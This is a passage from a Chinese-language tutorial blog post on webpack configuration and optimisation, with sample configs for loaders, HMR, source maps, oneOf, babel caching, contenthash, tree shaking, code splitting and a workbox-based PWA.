        options: { limit: 8 * 1024, name: &apos;[hash:10].[ext]&apos;, outputPath: &apos;imgs&apos;, esModule: false }
      },
      // &#x4E13;&#x95E8;&#x5904;&#x7406; html &#x4E2D;&#x56FE;&#x7247;&#x95EE;&#x9898;
      { test: /\.html$/, loader: &apos;html-loader&apos; }, // &#x4F7F;&#x7528;&#x7684;&#x662F; commonjs &#x800C; url-loader &#x4F7F;&#x7528;&#x7684;&#x662F; es6
      { 
        exclude: /\.(js|css|less|html|jpg|png|gif)/,
        loader: &apos;file-loader&apos;,
        options: { outputPath: &apos;media&apos; }
      }
    ]
  },
  plugins:[ 
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }),
    new OptimizeCssAssetsWebpackPlugin(),
    new HtmlWebpackPlugin({ 
      template: &apos;./src/index.html&apos;,
      // html &#x6587;&#x4EF6;&#x901A;&#x8FC7; minify &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x538B;&#x7F29;
      // &#x538B;&#x7F29;&#x7A7A;&#x683C;&#x3001;&#x6E05;&#x9664;&#x6CE8;&#x91CA;
      minify: { collapseWhitespace: true, removeComments: true}
    })
  ],
  mode: &apos;production&apos; 
};
</code></pre>
<pre><code class="language-javascript">&quot;browserlist&quot;: {
  &quot;development&quot;: [
    &quot;last 1 chrome version&quot;,
    &quot;last 1 firefox version&quot;,
    &quot;last 1 safari version&quot;
  ],
  &quot;production&quot;: [
    &quot;&gt;0.2%&quot;,
    &quot;not dead&quot;,
    &quot;not op_mini all&quot;
  ]
}
&quot;eslintConfig&quot;: {
  &quot;extends&quot;: &quot;airbnb-base&quot;
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="webpack">webpack &#x4F18;&#x5316;&#x914D;&#x7F6E;</h2>
<h3 id>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x4F18;&#x5316;</h3>
<p>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x4F18;&#x5316;&#x6307;&#x4F18;&#x5316;&#x6253;&#x5305;&#x6784;&#x5EFA;&#x901F;&#x5EA6;&#xFF08;&#x8C03;&#x8BD5;&#x3001;&#x5F00;&#x53D1;&#x53CB;&#x597D;&#xFF09;&#x3001;&#x4F18;&#x5316;&#x4EE3;&#x7801;&#x8C03;&#x8BD5;&#xFF08;&#x63D0;&#x9192;&#x5F00;&#x53D1;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x4F4D;&#x7F6E;&#xFF09;&#x3002;</p>
<ul>
<li>HMR(Hot Module Replace)</li>
</ul>
<p>&#x70ED;&#x6A21;&#x5757;&#x66FF;&#x6362;&#x5373;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x53EA;&#x9700;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x8FD9;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x800C;&#x5E76;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x5168;&#x90E8;&#x6A21;&#x5757;&#x3002;&#x672C;&#x5730;&#x4EE3;&#x7801;&#x6539;&#x53D8;&#xFF0C;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x3001;&#x5237;&#x65B0;&#x6D4F;&#x89C8;&#x5668;&#x5373;&#x4E3A;&#x70ED;&#x66F4;&#x65B0;&#x3002;HMR &#x529F;&#x80FD;&#x5BF9;&#x4E8E; <code>.js</code> &#x7684;&#x5904;&#x7406;&#x53EA;&#x80FD;&#x5904;&#x7406;&#x975E;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x7684;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x3002;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x8FDB;&#x884C; HMR &#x5219;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x3002;</p>
<table>
    <thead>
        <tr>
            <th>&#x6587;&#x4EF6;</th>
            <th>&#x70ED;&#x66F4;&#x65B0;</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>&#x6837;&#x5F0F;&#x6587;&#x4EF6;</td>
            <td>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; HMR&#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A; style-loader &#x5185;&#x90E8;&#x5DF2;&#x5B9E;&#x73B0;</td>
        </tr>
        <tr>
            <td>JS  &#x6587;&#x4EF6;</td>
            <td>&#x9ED8;&#x8BA4;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; HMR &#x529F;&#x80FD;</td>
        </tr>
        <tr>
            <td>html &#x6587;&#x4EF6;</td>
            <td>&#x9ED8;&#x8BA4;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; HMR&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0D;&#x9700;&#x8981;&#x8003;&#x8651; HMR &#x529F;&#x80FD;</td>
        </tr>
    </tbody>
</table>
<pre><code class="language-javascript">...
devServer: { // &#x4FEE;&#x6539; webpack &#x914D;&#x7F6E;&#x4E00;&#x5B9A;&#x8981;&#x91CD;&#x542F; webpack &#x670D;&#x52A1;
  ...,
  hot: true // &#x5F00;&#x542F; HMR &#x529F;&#x80FD;
}
</code></pre>
<pre><code class="language-javascript">...
import print from &apos;./print.js&apos;
if(module.hot) { // &#x4E00;&#x65E6; module.hot &#x4E3A; true &#x5219;&#x5F00;&#x542F; HMR &#x5C5E;&#x6027; -- &#x8BA9; HMR &#x529F;&#x80FD;&#x751F;&#x6548;
  module.hot.accept(&apos;./print.js&apos;, function(){ // &#x8FD9;&#x91CC;&#x7684; print.js &#x5DF2;&#x7ECF;&#x5B58;&#x5728;
    // &#x65B9;&#x6CD5;&#x76D1;&#x542C; print.js &#x6587;&#x4EF6;&#x53D8;&#x5316;, &#x4E00;&#x65E6;&#x53D8;&#x5316;&#x5176;&#x4ED6;&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x6784;&#x5EFA;
    // &#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;
    print();
  })
}
</code></pre>
<ul>
<li>source-map</li>
</ul>
<p>&#x4E00;&#x6B3E;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x8C03;&#x8BD5;&#x4EE3;&#x7801;&#x95EE;&#x9898;&#x5DE5;&#x5177;&#xFF0C;&#x63D0;&#x4F9B;&#x6E90;&#x4EE3;&#x7801;&#x5230;&#x6784;&#x5EFA;&#x540E;&#x4EE3;&#x7801;&#x6620;&#x5C04;&#x7684;&#x6280;&#x672F;&#x3002;&#x6784;&#x5EFA;&#x540E;&#x4EE3;&#x7801;&#x51FA;&#x9519;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x7684;&#x9519;&#x8BEF;&#x3002;</p>
<pre><code class="language-javascript">[inline-|hidden-|eval-][nosource-][cheap-[module-]]source-map
devtool: &quot;eval-source-map&quot; // &#x5F00;&#x53D1;&#x73AF;&#x5883;&#x6700;&#x4F73;
devtool: &quot;source-map&quot; // &#x751F;&#x4EA7;&#x73AF;&#x5883;&#x6700;&#x4F73;
</code></pre>
<table>
<thead>
<tr>
<th>&#x524D;&#x7F00;</th>
<th>&#x89E3;&#x91CA;</th>
</tr>
</thead>
<tbody>
<tr>
<td>inline</td>
<td>&#x5185;&#x8054;&#x6587;&#x4EF6;&#xFF1A;&#x5916;&#x90E8;&#x751F;&#x6210;&#x6587;&#x4EF6;&#xFF0C;<strong>&#x5185;&#x8054;&#x6CA1;&#x6709;&#x751F;&#x6210;</strong>&#xFF1B;&#x6784;&#x5EFA;&#x901F;&#x5EA6;&#x5FEB;&#xFF1B;</td>
</tr>
<tr>
<td>hidden</td>
<td>&#x53EA;&#x751F;&#x6210;&#x4E00;&#x4E2A; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x3002;</td>
</tr>
<tr>
<td>eval</td>
<td>&#x6BCF;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4F1A;&#x8FFD;&#x52A0; source-map&#xFF0C;&#x90FD;&#x5728; eval&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x591A;&#x4E86;&#x54C8;&#x5E0C;&#x503C;&#x3002;</td>
</tr>
<tr>
<td>nosource</td>
<td>&#x540C;&#x6837;&#x751F;&#x6210;&#x5916;&#x90E8; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x3002;&#x9632;&#x6B62;&#x6E90;&#x4EE3;&#x7801;&#x6CC4;&#x6F0F;&#x3002;</td>
</tr>
<tr>
<td>cheap</td>
<td>&#x751F;&#x6210;&#x5916;&#x90E8; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x63D0;&#x793A;&#x5230;&#x5177;&#x4F53;&#x7684;&#x4E00;&#x884C;&#x3002;</td>
</tr>
<tr>
<td>cheap-module</td>
<td>&#x751F;&#x6210;&#x5916;&#x90E8; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x63D0;&#x793A;&#x5230;&#x5177;&#x4F53;&#x7684;&#x884C;&#x5217;&#x3002;&#x4E14;&#x52A0;&#x4E0A; loader &#x4E2D;&#x52A0;&#x5165;&#x3002;</td>
</tr>
</tbody>
</table>
<ul>
<li>oneOf</li>
</ul>
<p>&#x5728;&#x5339;&#x914D; loader &#x65F6;&#x4F1A;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x5339;&#x914D;&#xFF0C;&#x4F7F;&#x7528; <code>oneOf</code> &#x8868;&#x793A;&#x4E00;&#x4E0B;&#x6570;&#x7EC4;&#x4E2D;&#x7684; loader &#x4EC5;&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#xFF0C;&#x8282;&#x7701;&#x65F6;&#x95F4;&#x4E0E;&#x529F;&#x8017;&#x3002;&#x7C7B;&#x4F3C;&#x4E8E; React &#x7684; Switch&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; );
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
// &#x5B9A;&#x4E49; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;: &#x51B3;&#x5B9A;&#x4F7F;&#x7528; browserslist &#x7684;&#x54EA;&#x4E2A;&#x73AF;&#x5883; 
process.env.NODE_ENV = &apos;production&apos;;
// &#x590D;&#x7528; loader 
const commonCssLoader = [
  MiniCssExtractPlugin.loader,
  &apos;css-loader&apos;,
  { 
    loader: &apos;postcss-loader&apos;,
    options: {
      ident: &apos;postcss&apos;, 
      plugins: () =&gt; [require(&apos;postcss-preset-env&apos;)()] 
    } 
  } 
];
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/built.js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { 
    rules: [
      {
        // &#x4EE5;&#x4E0B; loader &#x53EA;&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A; &#x8282;&#x7701;&#x65F6;&#x95F4;&#x4E0E;&#x5185;&#x5B58;&#x635F;&#x8017;
        // &#x6CE8;&#x610F;: &#x4E0D;&#x80FD;&#x4E24;&#x4E2A; loader &#x5904;&#x7406;&#x540C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;
        { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb 
        		test: /\.js$/,
        		exclude: /node_modules/,
        		// &#x4F18;&#x5148;&#x6267;&#x884C; &#x4E0D;&#x8BBA;&#x653E;&#x5728;&#x54EA;&#x91CC;&#x7684;&#x4F4D;&#x7F6E;!!!
        		enforce: &apos;pre&apos;, 
        		loader: &apos;eslint-loader&apos;,
        		options: { fix: true }
      		}
      },
      {
        oneOf: [
          { test: /\.css$/, use: [...commonCssLoader] },
      		{ test: /\.less$/, use: [...commonCssLoader, &apos;less-loader&apos;] },
        	// &#x4E0D;&#x80FD;&#x4E24;&#x4E2A; loader &#x5904;&#x7406;&#x540C;&#x4E00;&#x7C7B;&#x6587;&#x4EF6; -- &#x63D0;&#x51FA;
      		/* { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb 
        		test: /\.js$/,
        		exclude: /node_modules/,
        		// &#x4F18;&#x5148;&#x6267;&#x884C; &#x4E0D;&#x8BBA;&#x653E;&#x5728;&#x54EA;&#x91CC;&#x7684;&#x4F4D;&#x7F6E;!!!
        		enforce: &apos;pre&apos;, 
        		loader: &apos;eslint-loader&apos;,
        		options: { fix: true }
      		}, */
      		{
        		test: /\.js$/,
        		exclude: /node_modules/,
        		loader: &apos;babel-loader&apos;,
        		options: {
          		presets: [
            		[
              		&apos;@babel/preset-env&apos;,
              		{
                		useBuiltIns: &apos;usage&apos;, corejs: {version: 3},
                		targets: { chrome:&apos;60&apos;, firefox: &apos;50&apos; }
              		}
            		]
          		]
        		}
      		},
      		{ 
        		test: /\.(jpg|png|gif)/,
        		loader: &apos;url-loader&apos;,
        		options: { limit: 8 * 1024, name: &apos;[hash:10].[ext]&apos;, outputPath: &apos;imgs&apos;, esModule: false }
      		},
            { test: /\.html$/, loader: &apos;html-loader&apos; },
      		{ 
        		exclude: /\.(js|css|less|html|jpg|png|gif)/,
        		loader: &apos;file-loader&apos;,
        		options: { outputPath: &apos;media&apos; }
      		}
        ]
      }	
    ]
  },
  plugins:[ 
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }),
    new OptimizeCssAssetsWebpackPlugin(),
    new HtmlWebpackPlugin({ 
      template: &apos;./src/index.html&apos;,
      minify: { collapseWhitespace: true, removeComments: true}
    })
  ],
  mode: &apos;production&apos; 
};
</code></pre>
<ul>
<li>babel &#x7F13;&#x5B58;</li>
</ul>
<p>&#x8003;&#x8651;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x80FD;&#x7528; HMR &#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A; HMR &#x57FA;&#x4E8E; devServer &#x3002;&#x5728; babel &#x8FDB;&#x884C;&#x7FFB;&#x8BD1;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x65F6;&#x66F4;&#x6539;&#x6587;&#x4EF6;&#x53D8;&#x5316;&#x800C;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x4E0D;&#x53D8;&#xFF0C;&#x6B64;&#x65F6;&#x5E94;&#x8BE5;&#x5F00;&#x542F; babel &#x7F13;&#x5B58;&#xFF0C;&#x5C06;&#x4E4B;&#x524D;&#x7F16;&#x8BD1;&#x597D;&#x7684;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x5904;&#x7406;&#x3002;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x53D8;&#x5316;&#x5219;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x7F13;&#x5B58;&#x800C;&#x4E0D;&#x662F;&#x518D;&#x6784;&#x5EFA;&#x4E00;&#x6B21;&#x3002;</p>
<pre><code class="language-javascript">...{ 
  // babel &#x7F13;&#x5B58;
  test: /\.js$/, 
  exclude: /node_modules/, 
  loader: &apos;babel-loader&apos;, 
  options: { 
    presets: [ 
      [ 
        &apos;@babel/preset-env&apos;, 
        { 
          useBuiltIns: &apos;usage&apos;, 
          corejs: { version: 3 },
          targets: { chrome: &apos;60&apos;, firefox: &apos;50&apos; } 
        } 
      ]
    ],
    // &#x5F00;&#x542F; babel &#x7F13;&#x5B58; 
    // &#x7B2C;&#x4E8C;&#x6B21;&#x6784;&#x5EFA;&#x65F6;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E4B;&#x524D;&#x7684;&#x7F13;&#x5B58; 
    cacheDirectory: true 
  } 
},...
</code></pre>
<p>&#x6587;&#x4EF6;&#x8D44;&#x6E90;&#x7F13;&#x5B58;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x540D;&#x2014;&#x2014;&#x589E;&#x52A0; hash &#x503C;&#x3002;<strong>&#x6BCF;&#x6B21;&#x6784;&#x5EFA; webpack &#x751F;&#x6210;&#x552F;&#x4E00;&#x7684; hash &#x503C;</strong>&#x3002;&#x90A3;&#x4E48;&#x4F1A;&#x56E0;&#x4E3A; <code>.js</code> &#x548C; <code>.css</code> &#x4F7F;&#x7528;&#x552F;&#x4E00;&#x4E00;&#x4E2A; hash &#x503C;&#x5BFC;&#x81F4;&#x6240;&#x6709;&#x7F13;&#x5B58;&#x5931;&#x6548;&#xFF08;&#x6539;&#x52A8;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF09;&#x3002;&#x90A3;&#x4E48;&#x8003;&#x8651; chunkhash &#x503C;&#xFF0C;&#x6839;&#x636E; chunk &#x751F;&#x6210;&#x7684; hash &#x503C;&#xFF0C;&#x5982;&#x679C;&#x6253;&#x5305;&#x6765;<strong>&#x6E90;&#x4E8E;&#x540C;&#x4E00;&#x4E2A; chunk</strong> &#xFF0C;&#x90A3;&#x4E48; hash &#x503C;&#x4E00;&#x6837;&#x3002;&#xFF08;&#x6240;&#x6709;&#x6839;&#x636E;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x88AB;&#x5F15;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A; chunk&#xFF09;&#x3002;&#x6700;&#x7EC8;&#x9009;&#x62E9; contenthash &#xFF0C;<strong>&#x6839;&#x636E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x751F;&#x6210; hash &#x503C;</strong>&#xFF0C;&#x4E0D;&#x540C;&#x6587;&#x4EF6; hash &#x503C;&#x4E00;&#x5B9A;&#x4E0D;&#x4E00;&#x6837;&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; );
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
// &#x5B9A;&#x4E49; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF1A;&#x51B3;&#x5B9A;&#x4F7F;&#x7528; browserslist &#x7684;&#x54EA;&#x4E2A;&#x73AF;&#x5883; 
process.env.NODE_ENV = &apos;production&apos;; 
// &#x590D;&#x7528; loader
const commonCssLoader = [ 
  MiniCssExtractPlugin.loader,
  &apos;css-loader&apos;,
  { // &#x8FD8;&#x9700;&#x8981;&#x5728; package.json &#x4E2D;&#x5B9A;&#x4E49; browserslist
    loader: &apos;postcss-loader&apos;,
    options: {
      ident: &apos;postcss&apos;,
      plugins: () =&gt; [require(&apos;postcss-preset-env&apos;)()] } 
  }
];
module.exports = { 
  entry: &apos;./src/js/index.js&apos;,
  output: {
    // contenthash
    filename: &apos;js/built.[contenthash:10].js&apos;,
    path: resolve(__dirname, &apos;build&apos;)
  },
  module: {
    rules: [
      { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb
        test: /\.js$/, exclude: /node_modules/,
        // &#x4F18;&#x5148;&#x6267;&#x884C; 
        enforce: &apos;pre&apos;,
        loader: &apos;eslint-loader&apos;,
        options: { fix: true } 
      },
      { 
        // &#x4EE5;&#x4E0B; loader &#x53EA;&#x4F1A;&#x5339;&#x914D;&#x4E00;&#x4E2A;
        // &#x6CE8;&#x610F;&#xFF1A;&#x4E0D;&#x80FD;&#x6709;&#x4E24;&#x4E2A;&#x914D;&#x7F6E;&#x5904;&#x7406;&#x540C;&#x4E00;&#x79CD;&#x7C7B;&#x578B;&#x6587;&#x4EF6;
        oneOf: [
          { test: /\.css$/, use: [...commonCssLoader] },
          { test: /\.less$/, use: [...commonCssLoader, &apos;less-loader&apos;] },
          /*&#x6B63;&#x5E38;&#x6765;&#x8BB2;&#xFF0C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x53EA;&#x80FD;&#x88AB;&#x4E00;&#x4E2A; loader &#x5904;&#x7406;&#x3002; &#x5F53;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x8981;&#x88AB;&#x591A;&#x4E2A; loader &#x5904;&#x7406;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x6307;&#x5B9A; loader &#x6267;&#x884C;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF1A; &#x5148;&#x6267;&#x884C; eslint &#x5728;&#x6267;&#x884C; babel */
          {
            test: /\.js$/,
            exclude: /node_modules/,
            loader: &apos;babel-loader&apos;,
            options:
            {
              presets:[
                [
                  &apos;@babel/preset-env&apos;,
                  {
                    useBuiltIns: &apos;usage&apos;,
                    corejs: { version: 3 },
                    targets: { chrome: &apos;60&apos;, firefox: &apos;50&apos; }
                  }
                ]
              ],
							// &#x5F00;&#x542F; babel &#x7F13;&#x5B58; 
							// &#x7B2C;&#x4E8C;&#x6B21;&#x6784;&#x5EFA;&#x65F6;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E4B;&#x524D;&#x7684;&#x7F13;&#x5B58; 
              cacheDirectory: true
            }
          },
          {
            test: /\.(jpg|png|gif)/,
            loader: &apos;url-loader&apos;,
            options: { limit: 8 * 1024, name: &apos;[hash:10].[ext]&apos;, outputPath: &apos;imgs&apos;, esModule: false } },
          {
            test: /\.html$/,
            loader: &apos;html-loader&apos;
          },
          {
            exclude: /\.(js|css|less|html|jpg|png|gif)/,
            loader: &apos;file-loader&apos;,
            options: { outputPath: &apos;media&apos; } 
          } 
        ] 
      } 
    ] 
  },
  plugins: [
    // contenthash
    new MiniCssExtractPlugin({ filename: &apos;css/built.[contenthash:10].css&apos; }),
    new OptimizeCssAssetsWebpackPlugin(),
    new HtmlWebpackPlugin({
      template: &apos;./src/index.html&apos;,
      minify: { collapseWhitespace: true, removeComments: true } 
    }) 
  ],
  mode: &apos;production&apos;,
  devtool: &apos;source-map&apos; 
};
</code></pre>
<ul>
<li>tree shaking</li>
</ul>
<p>tree shaking &#x53EF;&#x4EE5;&#x53BB;&#x9664;&#x5728;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7684;&#x4EE3;&#x7801;&#xFF08;&#x5F15;&#x7528;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x7B2C;&#x4E09;&#x65B9;&#x7684;&#x5E93;&#xFF09;&#xFF0C;&#x4F7F;&#x5F97;&#x5E94;&#x7528;&#x4F53;&#x79EF;&#x66F4;&#x5C0F;&#xFF0C;&#x8BF7;&#x6C42;&#x3001;&#x52A0;&#x8F7D;&#x901F;&#x5EA6;&#x66F4;&#x5FEB;&#x3002;&#x5E94;&#x7528;&#x5176;&#x7684;&#x524D;&#x63D0;&#x662F;&#x4F7F;&#x7528; ES6 &#x6A21;&#x5757;&#x5316;&#x5E76;&#x5F00;&#x542F; production &#x73AF;&#x5883;&#x3002;&#x4F46;&#x662F;&#x53EF;&#x80FD;&#x4F1A;&#x5C06;&#x672A;&#x7ECF;&#x5F15;&#x7528;&#x7684; CSS &#x4EE3;&#x7801;&#x4E5F;&#x5FFD;&#x7565;&#x3002;&#x5982;&#x5728; package.json &#x4E2D;&#x8BBE;&#x7F6E; <code>&quot;sideEffects&quot;: false</code> &#x5219;&#x6240;&#x6709;&#x4EE3;&#x7801;&#x90FD;&#x65E0;&#x526F;&#x4F5C;&#x7528;&#xFF08;&#x53EF;&#x8FDB;&#x884C; tree shaking&#xFF09;&#x4F1A;&#x5BFC;&#x81F4;&#x53BB;&#x9664; <code>.css</code> &#x6587;&#x4EF6;&#x3002;&#x5E94;&#x5F53;&#x4FEE;&#x6539;&#x4E3A; <code>&quot;sideEffects&quot;: [&quot;*.css&quot;, &quot;*.less&quot;]</code></p>
<ul>
<li>code split</li>
</ul>
<p>&#x4EE3;&#x7801;&#x5206;&#x5272;&#x4E3B;&#x8981;&#x8FDB;&#x884C;&#x4E8E; <code>.js</code> &#x4EE3;&#x7801;&#xFF0C;&#x5B8C;&#x6210;&#x6309;&#x9700;&#x52A0;&#x8F7D;&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  // &#x5355;&#x5165;&#x53E3; 
  // entry: &apos;./src/js/index.js&apos;,
  entry: {
    index: &apos;./src/js/index.js&apos;,
    test: &apos;./src/js/test.js&apos;
  },
  output: {
    // [name]&#xFF1A;&#x53D6;&#x6587;&#x4EF6;&#x540D;
    filename: &apos;js/[name].[contenthash:10].js&apos;,
    path: resolve(__dirname, &apos;build&apos;) 
  },
  plugins: [
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos;, minify: { collapseWhitespace: true, removeComments: true } }) ],
  /*1. &#x53EF;&#x4EE5;&#x5C06; node_modules &#x4E2D;&#x4EE3;&#x7801;&#x5355;&#x72EC;&#x6253;&#x5305;&#x4E00;&#x4E2A; chunk &#x6700;&#x7EC8;&#x8F93;&#x51FA; 2. &#x81EA;&#x52A8;&#x5206;&#x6790;&#x591A;&#x5165;&#x53E3; chunk &#x4E2D;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x516C;&#x5171;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x6709;&#x4F1A;&#x6253;&#x5305;&#x6210;&#x5355;&#x72EC;&#x4E00;&#x4E2A; chunk */
  optimization: { splitChunks: { chunks: &apos;all&apos; } },
  mode: &apos;production&apos;
};
</code></pre>
<ul>
<li>pwa</li>
</ul>
<p>pwa &#x53C8;&#x79F0;&#x6E10;&#x8FDB;&#x5F0F;&#x7F51;&#x7EDC;&#x5F00;&#x53D1;&#x5E94;&#x7528;&#x7A0B;&#x5E8F; Progressive Web Apps&#xFF0C;&#x5373;&#x79BB;&#x7EBF;&#x53EF;&#x8BBF;&#x95EE;&#x3002;&#x901A;&#x5E38;&#x5728; webpack &#x4E2D;&#x4F7F;&#x7528;&#x63D2;&#x4EF6; workbox-webpack-plugin&#x3002;</p>
<pre><code class="language-javascript">// package.json
// &#x907F;&#x514D; eslint &#x4E0D;&#x8BA4;&#x8BC6; window&#x3001;navigator&#x6B64;&#x7C7B;&#x53D8;&#x91CF;
&quot;eslintConfig&quot;: {
  &quot;extends&quot;: &quot;airbnb-base&quot;,
    &quot;env&quot;: {
      // &#x652F;&#x6301;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x53D8;&#x91CF;
      &quot;browser&quot;: true
    }
}
</code></pre>
<pre><code class="language-javascript">// src/index.js
...
// &#x6CE8;&#x610F;&#x6B64;&#x5904; serviceWorker &#x4E2D; w &#x9996;&#x5B57;&#x6BCD;&#x5927;&#x5199;
if(&apos;serviceWorker&apos; in navigator) {
  window.addEventListener(&apos;load&apos;, () =&gt; {
    navigator.serviceworker.register(&apos;/service-worker.js&apos;)
    .then(() =&gt; {
      console.log(&apos;sw&#x6CE8;&#x518C;&#x6210;&#x529F;~&apos;)
    })
    .catch(() =&gt; {
      console.log(&apos;sw&#x6CE8;&#x518C;&#x5931;&#x8D25;~&apos;)
    })
  })
}
</code></pre>
<pre><code class="language-javascript">...
plugins: [
  new MiniCssExtractPlugin({ filename: &apos;css/built.[contenthash:10].css&apos; }),
  new OptimizeCssAssetsWebpackPlugin(),
  new HtmlWebpackPlugin({
    template: &apos;./src/index.html&apos;,
    minify: { collapseWhitespace: true, removeComments: true }
  }),
  new WorkboxWebpackPlugin.GenerateSW({
    /*1. &#x5E2E;&#x52A9; serviceworker &#x5FEB;&#x901F;&#x542F;&#x52A8; 2. &#x5220;&#x9664;&#x65E7;&#x7684; serviceworker &#x751F;&#x6210;&#x4E00;&#x4E2A; serviceworker &#x914D;&#x7F6E;&#x6587;&#x4EF6;~ */
    clientsClaim: true,
    skipWaiting: true 
  })
],...
</code></pre>
